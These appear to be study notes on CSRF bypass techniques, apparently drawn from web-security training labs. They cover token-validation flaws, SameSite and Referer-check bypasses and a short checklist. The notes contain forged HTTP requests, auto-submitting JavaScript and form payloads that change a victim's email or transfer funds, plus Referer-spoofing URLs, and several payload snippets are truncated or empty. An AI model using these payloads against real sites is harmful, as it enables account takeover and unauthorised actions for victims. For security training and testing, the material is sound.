# What is CSRF
Cross-site request forgery is a web security vulnerability that allows an attacker to induce ( force ) users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.
In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.

# Bypass Methods

## Try to Change Request 
- Method. Depend On Request Method. In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:

```
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

 ## Validation of CSRF token depends on token being present. 
 - In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```

## CSRF token is not tied to the user session
- Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool. In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.

## CSRF token is tied to a non-session cookie
- In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```
- This situation is **harder** to exploit but is still vulnerable. If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.

## CSRF where token is tied to non-session cookie


```
POST /my-account/change-email HTTP/2
Host: 0a12008d047b879581e97a1100d20019.web-security-academy.net
Cookie: session=pzPHJ6EPlS183BjFz3DLGo5hlRMYgN4R; csrfKey=vlQeqn1xYCGuSYAEjmlhx0uLIilYStLH

...
...
email=wiener%40new.mail&csrf=WoU9OTwuE59g21pxKJxUIjjLKUkaVN3X
```
- In this example **csrf** tied with csrfKey
- Send the request to Burp Repeater and observe that changing the session cookie logs you out, but changing the csrfKey cookie merely results in the CSRF token being rejected. This suggests that the csrfKey cookie may not be strictly tied to the session.
- If we swap the csrfKey cookie and csrf parameter from the first account to the second account, the request is accepted.
- Our final payload is : (<img> tag for putting csrfKey , and submit automaticly )

  </body>
</html>
```

## CSRF token is simply duplicated in a cookie (DOUBLE SUBMIT)
- Some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This called "double submit" defense

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```
- In this situation, the attacker can again perform a CSRF attack if the website contains any cookie setting functionality.
- The attacker doesn't need to obtain a valid token of their own.
- They simply invent a token  leverage the cookie-setting behavior to place their cookie into the victim's browser.

- Out Attack Payload

- Search functionality has no csrf protection, we use this
- And back-end only test csrf=csrf, not their value, in example both of csrf=fake


## Bypassing SameSite cookie restrictions
- SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. SameSite cookie restrictions provide partial protection against a variety of cross-site attacks, including CSRF, cross-site leaks, and some CORS exploits.
- Since 2021, Chrome applies Lax SameSite restrictions by default if the website that issues the cookie doesn't explicitly set its own restriction level.
- **Site** : https://my.site.com
- **Orign** : https://my.site.com:443
        Example : https://example.com	              http://example.com                No same-site and No same-orign
        Example : https://app.example.com           https://intranet.example.com      Same-site and No same-orign
- Before the SameSite mechanism was introduced, browsers sent cookies in every request to the domain that issued them, even if the request was triggered by an unrelated third-party website.
- SameSite restriction levels: Strict, Lax, None
- **Strict.** How Developers set Strict : `Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict` . This means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie.
- **Lax.** Browser send cookies when this 2 condition met:
      1. The request uses the GET method.
      2. The request resulted from a top-level navigation by the user, such as clicking on a link.
-  If the website issuing the cookie doesn't explicitly set a SameSite attribute, Chrome automatically applies Lax restrictions by default. (the cookie is not included in background requests, such as those initiated by scripts)
- **None**. `SameSite=None` . `Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure` this ensure that cookies sent over HTTPS, 

## Bypassing SameSite Lax restrictions using GET requests

```
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```
- Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the _method parameter in forms
```
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

## Bypassing SameSite restrictions using on-site gadgets
- In this example /post/comment/confirmation?postId=x (it is redirect page url) has vuln. If we change x to y, then script redirect us to y page
- Generate exploit
 1. Right-click on the request (POST request which exploitable) and select Change request method. Burp automatically generates an equivalent GET request.
 2. Go back to the exploit server and change the postId parameter in your exploit so that the redirect causes the browser to send the equivalent GET request for changing your email address:
```
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1"; ### DON'T Forget URL encode , here we encode & before submit
</script>
```

Look this: https://book.hacktricks.xyz/pentesting-web/websocket-attacks

## Bypassing SameSite Lax restrictions with newly issued cookies
- If a website doesn't include a SameSite attribute when setting a cookie, Chrome automatically applies Lax restrictions by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level POST requests. **NOTE:** This two-minute window does not apply to cookies that were explicitly set with the `SameSite=Lax` attribute.
- Need Cookie Refreshing For this attack
- Popup which blocked by browser, because not on-click
```
window.open('https://vulnerable-website.com/login/sso');
```
- Popup, on-click somewhere on page, not blocked by browser
```
window.onclick = () => {
    window.open('https://vulnerable-website.com/login/sso');
}
```

## Bypassing Referer-based CSRF defenses
- Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This approach is generally less effective and is often subject to bypasses.
- Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted.
- Add `      <meta name="referrer" content="never">` to Generated CSRF PoC 

## Validation of Referer can be circumvented
- Some applications validate the Referer header in a naive way that can be bypassed. For example, if the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain:
`http://vulnerable-website.com.attacker-website.com/csrf-attack`
- Likewise, if the application simply validates that the Referer contains its own domain name, then the attacker can place the required value elsewhere in the URL:
`http://attacker-website.com/csrf-attack?vulnerable-website.com`
- NOTE: Although you may be able to identify this behavior using Burp, you will often find that this approach no longer works when you go to test your proof-of-concept in a browser. In an attempt to reduce the risk of sensitive data being leaked in this way, many browsers now strip the query string from the Referer header by default.
- NOTE: You can override this behavior by making sure that the response containing your exploit has the `Referrer-Policy: unsafe-url` header set (note that Referrer is spelled correctly in this case, just to make sure you're paying attention!). This ensures that the full URL will be sent, including the query string.

    <script>
      history.pushState('', '', '/?0aad001c0348aecd80967172008d00e7.web-security-academy.net'); ### add target domain 3rd octet in push state, it only validate url is somewhere in url, not exact order.
      document.forms[0].submit();
    </script

# CSRF Check List
1. Remove the CSRF token and see if application accept request
2. Change request from POST to GET
3. See if CSRF token is tied to user session
